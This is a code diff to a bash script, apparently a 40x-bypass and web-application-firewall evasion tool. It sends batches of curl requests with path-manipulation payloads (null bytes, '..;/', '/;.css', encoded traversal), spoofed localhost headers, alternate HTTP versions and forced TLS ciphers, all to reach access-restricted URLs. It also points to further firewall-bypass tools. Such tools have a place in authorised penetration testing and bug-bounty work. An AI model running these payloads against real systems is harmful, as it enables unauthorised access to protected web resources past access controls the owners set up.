@@ -11,10 +11,10 @@ then
 	exit
 fi
 # bash neet set RED,GREEN,YELLOW,CLEAR empty
-RED="\e[1m\e[31m"
-GREEN="\e[1m\e[32m"
-YELLOW="\e[1m\e[33m"
-CLEAR="\e[0m"
+RED="\033[0;31m"
+GREEN="\033[0;32m"
+YELLOW="\033[0;33m"
+CLEAR="\033[0m"
 
 METHOD="GET" # default is GET
 TIMEOUT=-m"0" # TIMEOUT="-m 2"
@@ -84,6 +84,7 @@ function payload_Suffux(){
 		output "${1}%23" $(curl_wapper "${1}%23") &
 		output "${1}%00" $(curl_wapper "${1}%00") &
 		output "${1}..;/" $(curl_wapper "${1}..;/") &
+		output "${1}../" $(curl_wapper "${1}../") &
 		output "${1}%" $(curl_wapper "${1}%") &
 		output "${1}?" $(curl_wapper "${1}? ") &
 		output "${1}??" $(curl_wapper "${1}??") &
@@ -100,6 +101,7 @@ function payload_Suffux(){
 	output "${1}/%3f" $(curl_wapper "${1}/%3f") &
 	output "${1}/%" $(curl_wapper "${1}/%") &
 	output "${1}/?" $(curl_wapper "${1}/? ") &
+	output "${1}/;.css" $(curl_wapper "${1}/;.css") &
 	output "${1}/%00" $(curl_wapper "${1}/%00") &
 	output "${1}/??" $(curl_wapper "${1}/??") &
 	output "${1}/%20" $(curl_wapper "${1}/%20") &
@@ -117,7 +119,6 @@ function payload_Suffux(){
 	output "${1}/%2e/" $(curl_wapper "${1}/%2e/") &
 	output "${1}//" $(curl_wapper "${1}//") &
 	output "${1}/./" $(curl_wapper "${1}/./") &
-	output "${1}/../" $(curl_wapper "${1}/../") &
 	output "${1}/%2e%2e/" $(curl_wapper "${1}/%2e%2e/") &
 	output "${1}/%2e%2e%2f" $(curl_wapper "${1}/%2e%2e%2f") &
 	wait
@@ -136,6 +137,7 @@ function payload_Between(){
 		# fix https://www.baidu.com<payload>dir
 		output "${1};/${2}" $(curl_wapper "${1};/${2}") &
 		output "${1}\..\.\\\\${2}" $(curl_wapper "${1}\..\.\\${2}") &
+		output "${1}../${2}" $(curl_wapper "${1}../${2}") &
 		wait
 	fi
 
@@ -191,7 +193,7 @@ function payload_Header(){
 	output "X-Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Host: 127.0.0.1" $FULL_URL) &
 	output "Referer: $FULL_URL \t $FULL_URL"  $(curl_wapper -H "Referer: $FULL_URL" $FULL_URL) &
 	output "Host: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "Host: 127.0.0.1" $FULL_URL) &
-	output "too many headers one curl" $(curl_wapper -H "Proxy-Host: 127.0.0.1" \
+	output "Potential headers one curl" $(curl_wapper -H "Proxy-Host: 127.0.0.1" \
 													-H "Request-Uri: /$rewrite_url" \
 													-H "X-Forwarded: 127.0.0.1" \
 													-H "X-Forwarded-By: 127.0.0.1" \
@@ -216,8 +218,6 @@ function payload_Header(){
 													-H "X-Real-Ip: 127.0.0.1" \
 													$FULL_URL) &
 	wait
-
-	output "${METHOD} /${rewrite_url} HTTP/1.0" $(curl_wapper --http1.0 $FULL_URL) &
 	output "${METHOD} ${FULL_URL} HTTP/1.1 \t Host: 127.0.0.1" $(curl_wapper -H "Host: 127.0.0.1" --request-target  "${FULL_URL}" $FULL_URL) &
 	output "${METHOD} http://127.0.0.1/${rewrite_url} HTTP/1.1" $(curl_wapper --request-target  "http://127.0.0.1/${rewrite_url}" $FULL_URL) &
 	wait
@@ -242,27 +242,45 @@ FULL_URL="${URL}/${DIR}"
 if [ $ONLY_URL -eq 1 ]; then
 	FULL_URL="${URL}"
 fi
-######################## ip versoin ######################### 
-echo -e "\n${GREEN}[+] IP Version...${CLEAR}"
-output "curl --ipv4 $FULL_URL"  $(curl_wapper -4 $FULL_URL) &
-output "curl --ipv6 $FULL_URL"  $(curl_wapper -6 $FULL_URL) &
+######################## ip/http versoin ######################### 
+printf "\n${GREEN}[+] IP/HTTP Version...${CLEAR}\n"
+output "ipv4 "  $(curl_wapper -4 $FULL_URL) &
+output "ipv6 "  $(curl_wapper -6 $FULL_URL) &
+output "HTTP/2 prior knowledge" $(curl_wapper --http2-prior-knowledge $FULL_URL) &
+output "HTTP/2 " $(curl_wapper --http2 $FULL_URL) &
+output "HTTP/1.0 " $(curl_wapper --http1.0 $FULL_URL) &
+output "HTTP/0.9 " $(curl_wapper --http0.9 $FULL_URL) &
 wait
+######################## ssl ciphers ######################### 
+if [[ ${FULL_URL:0:5} == https ]];then
+	printf "\n${GREEN}[+] SSL ciphers abusing ...${CLEAR}\n"
+	output "ECDHE-RSA-AES256-SHA" $(curl_wapper --ciphers ECDHE-RSA-AES256-SHA $FULL_URL)
+	output "ECDHE-RSA-AES128-GCM-SHA256" $(curl_wapper --ciphers ECDHE-RSA-AES128-GCM-SHA256 $FULL_URL)
+	output "ECDHE-ECDSA-AES256-GCM-SHA384" $(curl_wapper --ciphers ECDHE-ECDSA-AES256-GCM-SHA384 $FULL_URL)
+	output "ECDHE-RSA-AES256-GCM-SHA384" $(curl_wapper --ciphers ECDHE-RSA-AES256-GCM-SHA384 $FULL_URL)
+	output "ECDHE-RSA-AES256-SHA384" $(curl_wapper --ciphers ECDHE-RSA-AES256-SHA384 $FULL_URL)
+	output "AES256-GCM-SHA384" $(curl_wapper --ciphers AES256-GCM-SHA384 $FULL_URL)
+	output "DHE-RSA-AES256-GCM-SHA384" $(curl_wapper --ciphers DHE-RSA-AES256-GCM-SHA384 $FULL_URL)
+	printf "More ciphers be supported in tools: \n"
+	printf "\thttps://github.com/LandGrey/abuse-ssl-bypass-waf.git\n"
+	printf "\thttps://github.com/viperbluff/WAF_buster.git\n"
+fi
 ####################### HTTP Methods ######################## 
-echo -e "\n${GREEN}[+] HTTP Methods...${CLEAR}"
+printf "\n${GREEN}[+] HTTP Methods...${CLEAR}\n"
 #DELETE disabled by default, too dangerous
 for Verb in {"OPTIONS","HEAD","PUT","POST","TRACE","TRACK","PATCH","MOVE","CONNECT"}
 do
 	if [[ $Verb == "POST" ]]; then
 		output "$Verb \t $FULL_URL" $(curl_wapper -H "Content-Length: 0" -X POST $FULL_URL) &
 	elif [[  $Verb == "HEAD"  ]]; then
-		output "$Verb \t $FULL_URL" $(curl_wapper -m 1 -X HEAD $FULL_URL) & # timeout=1
+		output "$Verb \t $FULL_URL" $(curl_wapper -m 2 -X HEAD $FULL_URL) & # timeout=1
 	else
 		output "$Verb \t $FULL_URL" $(curl_wapper -X $Verb $FULL_URL) &
 	fi
 done
 wait
 ###################### Bugbountytips ##########################
-echo -e "\n${GREEN}[+] Bugbountytips 40x bypass methods...${CLEAR}"
+printf "\n${GREEN}[+] Bugbountytips 40x bypass methods...${CLEAR}\n"
 FULL_URL_1="${URL}/${DIR%/}"
 if [ $ONLY_URL -eq 1 ]; then 
 	FULL_URL_1="${URL%/}" 
@@ -275,5 +293,7 @@ if [ $ONLY_URL -ne 1 ]; then
 fi
 
 ########################## HEADERS #############################
-echo -e "\n${GREEN}[+] HEADERS...${CLEAR}"
+printf "\n${GREEN}[+] HEADERS...${CLEAR}\n"
 payload_Header $FULL_URL
+
+printf "\nMore waf bypass techniques click https://www.youtube.com/watch?v=tSf_IXfuzXk"
